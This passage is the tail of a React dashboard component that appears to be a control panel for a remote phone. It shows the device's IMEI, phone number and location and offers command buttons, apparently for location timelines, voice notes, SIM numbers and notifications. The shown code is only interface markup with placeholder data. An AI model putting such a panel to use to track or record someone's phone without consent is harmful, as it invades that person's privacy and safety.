                  <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                </span>
                <span className="hidden xs:inline text-[10px] leading-tight mt-0.5 truncate max-w-[60px]">Info</span>
              </button>
            </div>
            {/* Command Menu Overlay - Removed, as all commands are in bottom nav */}
          </div> 
        </main>

        {/* Right Sidebar */}
        <aside className="hidden md:flex w-80 bg-white/90 border-l flex-col py-8 px-6 shadow-md min-h-[calc(100vh-4rem)]">
          <h2 className="text-lg font-bold text-blue-700 mb-6 flex items-center gap-2">
            <svg className="w-6 h-6 text-blue-400" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg>
            Device Info
          </h2>
          <div className="space-y-4 text-gray-700">
            <div className="flex items-center gap-2"><span className="font-semibold text-blue-600">Name:</span> <span className="bg-blue-50 px-2 py-1 rounded-md text-sm">{dummyDeviceInfo.name}</span></div>
            <div className="flex items-center gap-2"><span className="font-semibold text-yellow-600">Battery:</span> <span className="bg-yellow-50 px-2 py-1 rounded-md text-sm">{dummyDeviceInfo.battery}</span></div>
            <div className="flex items-center gap-2"><span className="font-semibold text-green-600">Status:</span> <span className="bg-green-50 px-2 py-1 rounded-md text-sm">{dummyDeviceInfo.status}</span></div>
            <div className="flex items-center gap-2"><span className="font-semibold text-indigo-600">OS:</span> <span className="bg-indigo-50 px-2 py-1 rounded-md text-sm">{dummyDeviceInfo.os}</span></div>
            <div className="flex items-center gap-2"><span className="font-semibold text-gray-600">Last Seen:</span> <span className="bg-gray-50 px-2 py-1 rounded-md text-sm">{dummyDeviceInfo.lastSeen}</span></div>
            <div className="flex items-center gap-2"><span className="font-semibold text-pink-600">IMEI:</span> <span className="bg-pink-50 px-2 py-1 rounded-md text-sm">{dummyDeviceInfo.imei}</span></div>
            <div className="flex items-center gap-2"><span className="font-semibold text-purple-600">Phone #:</span> <span className="bg-purple-50 px-2 py-1 rounded-md text-sm">{dummyDeviceInfo.phoneNumber}</span></div>
            <div className="flex items-center gap-2"><span className="font-semibold text-red-600">Location:</span> <span className="bg-red-50 px-2 py-1 rounded-md text-sm">{dummyDeviceInfo.location}</span></div>
          </div>
        </aside>
      </div>

      {/* Mobile Device Info Panel */}
      {isDeviceInfoOpenOnMobile && (
        <div className="md:hidden fixed inset-0 bg-black/40 z-30" onClick={() => setIsDeviceInfoOpenOnMobile(false)} aria-hidden="true"></div>
      )}
      <aside
        className={`md:hidden fixed top-0 right-0 bottom-0 w-4/5 max-w-xs bg-white shadow-xl z-40 transform transition-transform duration-300 ease-in-out flex flex-col
                    ${isDeviceInfoOpenOnMobile ? "translate-x-0" : "translate-x-full"}`}
        aria-labelledby="device-info-heading-mobile"
      >
        <div className="flex justify-between items-center p-4 border-b sticky top-0 bg-white z-10">
          <h2 id="device-info-heading-mobile" className="text-lg font-bold text-blue-700 flex items-center gap-2">
            <svg className="w-6 h-6 text-blue-400" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg>
            Device Info
          </h2>
          <button onClick={() => setIsDeviceInfoOpenOnMobile(false)} className="text-gray-500 hover:text-gray-700 p-2 -mr-2" aria-label="Close device info">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-6 h-6">
              <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
        </div>
        <div className="p-4 space-y-3 text-sm text-gray-700 overflow-y-auto flex-1">
          {/* Device Info Content (copied from original right sidebar) */}
          <div className="flex items-start gap-2"><span className="font-semibold text-blue-600 w-20 shrink-0">Name:</span> <span className="bg-blue-50 px-2 py-1 rounded-md text-xs flex-1 break-words">{dummyDeviceInfo.name}</span></div>
          <div className="flex items-start gap-2"><span className="font-semibold text-yellow-600 w-20 shrink-0">Battery:</span> <span className="bg-yellow-50 px-2 py-1 rounded-md text-xs flex-1">{dummyDeviceInfo.battery}</span></div>
          <div className="flex items-start gap-2"><span className="font-semibold text-green-600 w-20 shrink-0">Status:</span> <span className="bg-green-50 px-2 py-1 rounded-md text-xs flex-1">{dummyDeviceInfo.status}</span></div>
          <div className="flex items-start gap-2"><span className="font-semibold text-indigo-600 w-20 shrink-0">OS:</span> <span className="bg-indigo-50 px-2 py-1 rounded-md text-xs flex-1">{dummyDeviceInfo.os}</span></div>
          <div className="flex items-start gap-2"><span className="font-semibold text-gray-600 w-20 shrink-0">Last Seen:</span> <span className="bg-gray-50 px-2 py-1 rounded-md text-xs flex-1">{dummyDeviceInfo.lastSeen}</span></div>
          <div className="flex items-start gap-2"><span className="font-semibold text-pink-600 w-20 shrink-0">IMEI:</span> <span className="bg-pink-50 px-2 py-1 rounded-md text-xs flex-1 break-words">{dummyDeviceInfo.imei}</span></div>
          <div className="flex items-start gap-2"><span className="font-semibold text-purple-600 w-20 shrink-0">Phone #:</span> <span className="bg-purple-50 px-2 py-1 rounded-md text-xs flex-1 break-words">{dummyDeviceInfo.phoneNumber}</span></div>
          <div className="flex items-start gap-2"><span className="font-semibold text-red-600 w-20 shrink-0">Location:</span> <span className="bg-red-50 px-2 py-1 rounded-md text-xs flex-1 break-words">{dummyDeviceInfo.location}</span></div>
        </div>
      </aside>

      {/* Mobile Menu Overlay */}
      {isMobileMenuOpen && (
        <div className="md:hidden fixed inset-0 bg-black bg-opacity-50 z-40" onClick={toggleMobileMenu}>
          <div 
            className="absolute top-16 left-0 w-64 h-[calc(100%-4rem)] bg-white shadow-xl p-4 overflow-y-auto animate-in slide-in-from-left"
            onClick={(e) => e.stopPropagation()}
          >
            <h2 className="text-lg font-bold text-blue-700 mb-4 flex items-center gap-2">
              <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" d="M4 6h16M4 12h16M4 18h16"/>
              </svg>
              Commands
            </h2>
            <ul className="space-y-2">
              {commands.map(cmd => (
                <li key={cmd.label}>
                  <button 
                    onClick={() => handleCommandClick(cmd.command)}
                    disabled={!cmd.command}
                    className="w-full text-left px-3 py-2.5 rounded hover:bg-blue-50 font-medium text-gray-700 transition flex items-center gap-3"
                    style={{ opacity: cmd.command ? 1 : 0.5 }}
                  >
                    {commandIcons[cmd.label]}
                    <span>{cmd.label}</span>
                  </button>
                </li>
              ))}
            </ul>
          </div>
        </div>
      )}
      
      {/* Mobile Bottom Navigation for Commands */}
      <nav className="md:hidden fixed bottom-0 left-0 right-0 h-16 bg-white border-t border-gray-200 shadow-lg flex justify-around items-center z-30">
        {commands.slice(0, 5).map(cmd => ( // Display up to 5 commands
          <button
            key={cmd.label}
            onClick={() => sendCommand(cmd.command)}
            disabled={!cmd.command}
            className="flex flex-col items-center justify-center text-[10px] text-gray-600 hover:text-blue-600 disabled:opacity-40 p-1 w-1/5 h-full focus:outline-none focus:bg-blue-50 transition-colors duration-150"
            title={cmd.label}
            style={{ opacity: cmd.command ? 1 : 0.5 }}
          >
            <div className="h-7 w-7 flex items-center justify-center mb-0.5 text-gray-600">
              {commandIcons[cmd.label] || <div className="w-5 h-5 bg-gray-300 rounded-sm" />}
            </div>
            <span className="truncate w-full text-center leading-tight text-[9px] font-medium">
              {cmd.label
                .replace("Get ", "")
                .replace("Location Timeline", "Timeline")
                .replace("Voice Note", "Voice")
                .replace("Sim Numbers", "SIMs")
                .replace("Send Notification", "Notify")
              }
            </span>
          </button>
        ))}
      </nav>
    </div>
  );
};

export default Dashboard;
